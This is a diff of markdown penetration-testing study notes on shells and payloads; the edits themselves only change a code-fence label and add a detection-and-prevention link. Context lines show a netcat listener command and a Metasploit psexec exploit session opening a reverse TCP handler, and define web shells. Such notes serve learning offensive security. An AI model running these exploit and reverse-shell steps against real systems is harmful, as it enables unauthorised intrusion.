@@ -35,8 +35,8 @@ sudo nc -lvnp 443
 ## Payloads
 the payload is the command and/or code that exploits the vulnerability in an OS and/or application
 ### Automating Payloads & Delivery with Metasploit
+
 ```bash
-```shell-session
 msf6 exploit(windows/smb/psexec) > exploit
 
 [*] Started reverse TCP handler on 10.10.14.222:4444 
@@ -67,3 +67,4 @@ check => [[linux| NIX Shells]]
 
 A `web shell` is a browser-based shell session we can use to interact with the underlying operating system of a web server
  see more =>  [[web shells| Web Shells]]
+ ## [[Detection & Prevention]]
